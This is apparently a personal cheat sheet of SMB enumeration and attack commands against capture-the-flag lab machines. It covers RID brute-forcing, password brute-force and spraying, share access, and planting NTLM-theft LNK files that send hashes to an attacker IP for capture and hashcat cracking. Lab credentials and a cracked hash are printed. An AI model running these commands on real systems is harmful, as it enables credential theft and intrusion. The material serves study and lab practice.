---
publish: true
created: 2026-02-06T18:21:37.696+05:30
modified: 2026-06-22T09:02:09.656+05:30
---

**Other Urls**:
<https://0xdf.gitlab.io/cheatsheets/smb-enum#>

**ncx**:if there is error - _NetBIOSTimeout_ , increase the timeout with _--smb-timeout 10_.

# Enumerate users

## User Account Enumeration

### RID Cycling

```
$ nxc smb servmon.htb -u 'nadine' -p 'L1k3B1gBut7s@W0rk' --rid-brute
SMB         10.129.6.112    445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:None)
SMB         10.129.6.112    445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk 
SMB         10.129.6.112    445    SERVMON          500: SERVMON\Administrator (SidTypeUser)
SMB         10.129.6.112    445    SERVMON          501: SERVMON\Guest (SidTypeUser)
SMB         10.129.6.112    445    SERVMON          503: SERVMON\DefaultAccount (SidTypeUser)
SMB         10.129.6.112    445    SERVMON          504: SERVMON\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.6.112    445    SERVMON          513: SERVMON\None (SidTypeGroup)
SMB         10.129.6.112    445    SERVMON          1000: SERVMON\Nathan (SidTypeUser)
SMB         10.129.6.112    445    SERVMON          1001: SERVMON\Nadine (SidTypeUser)
```

### Bruteforce

`users` - file containing usernames.
`passwords` - file containing passwords.

```
$ nxc smb servmon.htb -u users -p passwords --continue-on-success
SMB         10.129.6.112    445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:None)
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.129.6.112    445    SERVMON          [+] ServMon\nadine:L1k3B1gBut7s@W0rk 
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.129.6.112    445    SERVMON          [-] ServMon\nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE
```

## Password Spray

Just take the known password and spray it with all the known usersnames on the machine.

```
nxc smb flight.htb -u users -p 'S@Ss!K@*t13' --continue-on-success
```

# Share with Access

## smbclient

- using smbclient

```bash
# better to use IPs instead of hostnames, caution to specials character in command prompt

## list shares, anonymously

smbclient -L \\host -N

## get smb session
smbclient //support.htb//support-tools --user=anonymous --no-pass
smbclient //support.htb/support-tools --user=anonymous --password=a

## connect as username

smbclient //10.10.10.100/C$  -U active.htb\\Administrator%Ticketmaster1968

## connect as anon user

smbclient //anon.thm/<share> -N

## run command

smbclient //<host>/<share> -c 'ls' -N

## One liner for connecting and getting all files as anon

smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *''
```

## nxc

```
nxc smb [IP] -u '' -p ''

# Get files directly from \\ip\\share\folder\filename
$ nxc smb hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' --smb-timeout 10 --share SYSVOL --get-file '\\hutch.offsec\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\comment.cmtx' 'comment.cmtx'

# spider with nxc. pattern is mandatory, escape badchars.
$ nxc smb MONTEVERDE -u 'SABatchJobs' -p 'SABatchJobs' --spider users\$ --pattern xml

# spider_plus spiders everything. metdata etc. time taking

```

## mount

- Using mount

```
## mount smb share 
sudo mount -t cifs //10.10.10.134/backups /mnt/bastion
sudo mount -t cifs //blackfield.local/forensic /mnt/blackfield -o username=audit2020,password=Password123!
```

## enum4linux

```
enum4linux -a 10.10.10.100
enum4linux -a -u user -p 'pass' domain.htb
```

## smbmap

```
smbmap -H hostname
smbmap -u user -p 'pass' -H domain.htb
smbmap -H MEGABANK.LOCAL -u SABatchJobs -p SABatchJobs -r 'users$/' --depth 15
```

## winexe

```
winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
```

# Share with WRITE access

## LNK - link

### NTLM Theft

Generate LNK type of files. <https://github.com/Greenwolf/ntlm_theft>

```
$ python ntlm_theft.py --generate all --server 10.10.14.53 --filename slnky

cd slnky # all files with all file types are generate here in subdir.
```

use smb to put files in share with WRITE access.

```
# after smb login
smb: \> mput *
```

any one of the file type would get redirected to responder.
captured with _responder_.

```
$ sudo responder -I tun0 -A
```

can be cracked with _hashcat_.

```
$ hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt --show
SVC_APACHE::flight:bae104fca46957d3:b4a0c6bdad4ae299442fc4a6aa13e5e4:01010000000000008046235c02acdc019b0f06566bde2d7c00000000020008004700520050004d0001001e00570049004e002d005a00590034004700590036004400500044005300380004003400570049004e002d005a0059003400470059003600440050004400530038002e004700520050004d002e004c004f00430041004c00030014004700520050004d002e004c004f00430041004c00050014004700520050004d002e004c004f00430041004c00070008008046235c02acdc01060004000200000008003000300000000000000000000000003000009b3c1b006d0510e8d7fee033abaf56a9755ded3faa2f7f76b28ecb1a096249880a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00350033000000000000000000:S@Ss!K@*t13
```

### nxc slinky

```
$ nxc smb flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13' -M slinky -o Name=test SERVER=10.10.14.53
```
